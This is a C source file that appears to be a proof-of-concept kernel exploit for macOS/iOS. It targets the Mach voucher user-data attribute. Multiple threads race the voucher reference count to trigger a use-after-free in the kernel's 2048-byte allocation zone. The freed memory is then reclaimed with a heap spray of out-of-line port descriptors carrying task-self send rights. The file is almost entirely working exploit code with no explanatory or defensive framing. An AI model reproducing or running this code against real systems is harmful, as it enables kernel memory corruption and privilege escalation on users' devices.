#include <mach/mach.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// mach_voucher_types.h
#define MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE   5120

#define SECOND 1

#define EMADE_RACE_TRIES 500
#define EMADE_RACE_THREAD 4
#define REDEEM_RECIPES 256

#define OOL_PORTS 256 // 256 * POINTER == 2058 B <- user_data_content + sizeof(user_data_element) ==  2016 + 32 == 2048 B
#define OOL_MESSAGES 0x30
#define CONTENT_SIZE 2016 // kalloc.2048 <- not much noise on macos

#define TRIES 10000

#define WAIT 0
#define START 1
#define DONE 2

#define STRATEGY 1
// #define STRATEGY 2

volatile int sync_threads, spray_go;
volatile mach_port_t voucher, spray_port;

static void hexdump(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

mach_port_t create_voucher(mach_port_t host, uint64_t id) {
    mach_port_t new_voucher;
    kern_return_t kr;
    #pragma clang diagnostic push
    #pragma clang diagnostic ignored "-Wgnu-variable-sized-type-not-at-end"
    struct __attribute__((packed)) {
        mach_voucher_attr_recipe_data_t user_data_recipe;
        char padding[CONTENT_SIZE - sizeof(uint64_t)];
        uint64_t user_data_content;
    } recipes = {};
    #pragma clang diagnostic pop
    recipes.user_data_recipe.key = MACH_VOUCHER_ATTR_KEY_USER_DATA;
    recipes.user_data_recipe.command = MACH_VOUCHER_ATTR_USER_DATA_STORE;
    recipes.user_data_recipe.content_size = CONTENT_SIZE;
    recipes.user_data_content = id;
    bzero(recipes.padding, sizeof(recipes.padding));

    new_voucher = MACH_PORT_NULL;

    kr = host_create_mach_voucher(
            host,
            (mach_voucher_attr_raw_recipe_array_t) &recipes,
            sizeof(recipes),
            &new_voucher);
    return new_voucher;
}

mach_port_t redeem_voucher(mach_port_t host, mach_port_t voucher, uint64_t id) {
    mach_port_t new_voucher;
    kern_return_t kr;
    #pragma clang diagnostic push
    #pragma clang diagnostic ignored "-Wgnu-variable-sized-type-not-at-end"
    struct __attribute__((packed)) {
        mach_voucher_attr_recipe_data_t user_data_recipe;
        char padding[CONTENT_SIZE - sizeof(uint64_t)];
        uint64_t user_data_content;
    } recipes = {};
    #pragma clang diagnostic pop
    recipes.user_data_recipe.key = MACH_VOUCHER_ATTR_KEY_USER_DATA;
    recipes.user_data_recipe.command = MACH_VOUCHER_ATTR_REDEEM;
    recipes.user_data_recipe.content_size = CONTENT_SIZE;
    recipes.user_data_content = id;
    recipes.user_data_recipe.previous_voucher = voucher;
    bzero(recipes.padding, sizeof(recipes.padding));

    new_voucher = MACH_PORT_NULL;

    kr = host_create_mach_voucher(
            host,
            (mach_voucher_attr_raw_recipe_array_t) &recipes,
            sizeof(recipes),
            &new_voucher);
    // printf("redeem_voucher: %x\n", kr);
    return new_voucher;    
}

mach_port_t multiple_redeem_voucher(mach_port_t host, uint64_t id) {
    mach_port_t new_voucher;
    kern_return_t kr;
    int i;
    #pragma clang diagnostic push
    #pragma clang diagnostic ignored "-Wgnu-variable-sized-type-not-at-end"
    struct __attribute__((packed)) {
        mach_voucher_attr_recipe_data_t user_data_recipe;
        char padding[CONTENT_SIZE - sizeof(uint64_t)];        
        uint64_t user_data_content;
        mach_voucher_attr_recipe_data_t redeem_recipe[REDEEM_RECIPES];
    } recipes = {};
    #pragma clang diagnostic pop
    recipes.user_data_recipe.key = MACH_VOUCHER_ATTR_KEY_USER_DATA;
    recipes.user_data_recipe.command = MACH_VOUCHER_ATTR_USER_DATA_STORE;
    recipes.user_data_recipe.content_size = CONTENT_SIZE;
    recipes.user_data_content = id;
    recipes.user_data_recipe.previous_voucher = MACH_PORT_NULL;
    bzero(recipes.padding, sizeof(recipes.padding));
    for (i = 0; i < REDEEM_RECIPES; i++) {
        recipes.redeem_recipe[i].key = MACH_VOUCHER_ATTR_KEY_USER_DATA;
        recipes.redeem_recipe[i].command = MACH_VOUCHER_ATTR_REDEEM;
        recipes.redeem_recipe[i].content_size = 0;
        recipes.redeem_recipe[i].previous_voucher = MACH_PORT_NULL;
    }

    new_voucher = MACH_PORT_NULL;

    kr = host_create_mach_voucher(
            host,
            (mach_voucher_attr_raw_recipe_array_t) &recipes,
            sizeof(recipes),
            &new_voucher);
    // printf("redeem_voucher: %x\n", kr);
    return new_voucher;    
}

void release_voucher(mach_port_t voucher_port) {
   kern_return_t kr; 
   // kr = mach_port_deallocate(mach_task_self(), voucher);
   kr = mach_port_destroy(mach_task_self(), voucher_port);
   // printf("release_voucher: %x\n", kr);
}

void redeem_thread(void *arg) {
    mach_port_t host;
    // mach_port_t host, voucher;
    uint64_t id;

    // voucher = *(mach_port_t *)arg;
    host = mach_host_self();
    id = *(uint64_t *)arg;

    while (sync_threads == WAIT) {}
    // redeem_voucher(host, voucher, 0);
    voucher = create_voucher(host, id);
}

void release_thread(void *arg) {
    mach_port_t voucher_port;

    voucher_port = *(mach_port_t *)arg;

    while (sync_threads == WAIT) {}
    release_voucher(voucher_port);
}

void inc_emade_thread(void *arg) {
    mach_port_t host;
    int i;
    uint64_t id;

    host = mach_host_self();
    id = *(uint64_t *)arg;

    while (sync_threads == WAIT) {}
    for (i = 0; i < EMADE_RACE_TRIES; i++) {
        // redeem_voucher(host, voucher, 0);
        multiple_redeem_voucher(host, id);
    }
}

struct ool_ports_msg {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports[];
};

typedef struct ool_ports_msg * ool_ports_msg_t;

int ool_ports_descriptor_spray(mach_port_t receive_port)
{
    size_t i, msg_size;;
    mach_port_t *ports;
    ool_ports_msg_t ool_msg;
    mach_msg_return_t ret;

    msg_size = (sizeof(struct ool_ports_msg) +
        (OOL_MESSAGES * sizeof(mach_msg_ool_ports_descriptor_t)));
    ool_msg = calloc(1, msg_size);

    ports = calloc(OOL_PORTS, sizeof(mach_port_t));
    for (i = 0; i < OOL_PORTS; i++) {
        // ports[i] = MACH_PORT_DEAD; // == ~0
        ports[i] = mach_task_self();
    }

    ool_msg->header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    ool_msg->header.msgh_size =  msg_size;
    ool_msg->header.msgh_remote_port = receive_port;
    ool_msg->header.msgh_local_port = MACH_PORT_NULL;
    ool_msg->header.msgh_id = 0x10101010;

    ool_msg->body.msgh_descriptor_count = OOL_MESSAGES;

    for (i = 0; i < OOL_MESSAGES; i++) {
        ool_msg->ool_ports[i].address = ports;
        ool_msg->ool_ports[i].count = OOL_PORTS;
        ool_msg->ool_ports[i].deallocate = 0;
        ool_msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
        ool_msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        ool_msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
    }

    while (spray_go == WAIT) {};

    ret = mach_msg_send(&ool_msg->header);
    if (ret != MACH_MSG_SUCCESS)
    {
        printf("Problem during OOL spray: 0x%x\n", ret);
        return 1;
    }

    free(ports);
    free(ool_msg);

    return 0;
}

void spray_thread(void *arg) {
    mach_port_t receive_port;
    mach_msg_return_t ret;  
    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &receive_port)) != KERN_SUCCESS)
    {
        printf("receive_port Allocation Failed: %x\n", ret);
        return;
    }

    ool_ports_descriptor_spray(receive_port);
    spray_go = DONE;
}

void strategy_one() {
    mach_port_t host, thread, receive_port;
    kern_return_t kr;
    pthread_t redeem, release, spray;
    pthread_t inc_emade[EMADE_RACE_THREAD];
    int i, j;
    void *recipe;
    mach_voucher_attr_raw_recipe_size_t recipe_size, recipe_legit_size;
    mach_msg_return_t ret;

    host = mach_host_self();

    recipe_size = MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE;
    recipe_legit_size = MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE;
    recipe = calloc(1, (size_t) recipe_size);

    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &receive_port)) != KERN_SUCCESS)
    {
        printf("receive_port Allocation Failed: %x\n", ret);
        return;
    }
    spray_go = START;
    ool_ports_descriptor_spray(receive_port);
    ool_ports_descriptor_spray(receive_port);

    for (j = 0; j < TRIES; j++) {        
        voucher = create_voucher(host, j);

        if (j == 0)
        {
            mach_voucher_extract_attr_recipe_trap(voucher, MACH_VOUCHER_ATTR_KEY_USER_DATA, recipe, &recipe_legit_size);
            printf("legit recipe_size:%x\n", recipe_legit_size);
            // hexdump(recipe, recipe_size);
        }

        sync_threads = WAIT;
        // race e_made++ (non-atomic increment)
        for (i = 0; i < EMADE_RACE_THREAD; i++) {
            pthread_create(&inc_emade[i], NULL, (void *)&inc_emade_thread, (void *)&j);
        }

        sync_threads = START;
        for (i = 0; i < EMADE_RACE_THREAD; i++) {
            pthread_join(inc_emade[i], NULL);
        }

        spray_go = WAIT;

        pthread_create(&spray, NULL, (void *)&spray_thread, NULL);

        //printf("voucher: %x\n", voucher);
        sync_threads = WAIT;
        pthread_create(&redeem, NULL, (void *)&redeem_thread, (void *)&j);
        pthread_create(&release, NULL, (void *)&release_thread, (void *)&voucher);
        sync_threads = START;

        pthread_join(redeem, NULL);
        pthread_join(release, NULL);

        spray_go = START;
        while (spray_go != DONE) {}

        kr = mach_voucher_extract_attr_recipe_trap(voucher, MACH_VOUCHER_ATTR_KEY_USER_DATA, recipe, &recipe_size);
        //printf("voucher: %x\n", voucher);
        // printf("kr: 0x%x\n", kr);
        // printf("recipe_size: 0x%x\n", recipe_size);
        // printf("recipe_legit_size: 0x%x\n", recipe_legit_size);
        if (kr == KERN_SUCCESS) {
            if (recipe_size != recipe_legit_size) {
                printf("SUCCESS?\n");
                break;
            }
        }
        else if (kr == KERN_NO_SPACE) {
            printf("UAF?\n");
            break;
        }
        else {
            printf("kr: 0x%x\n", kr);
        }
        mach_port_destroy(mach_task_self(), voucher);
        mach_port_destroy(mach_task_self(), receive_port);
    }
}

void strategy_two() {
    printf("Not implemented\n");
}

int main(int argc, const char *argv[]) {
    if (STRATEGY == 1) {
        strategy_one();
    } else {
        strategy_two();
    }

    return 0;
}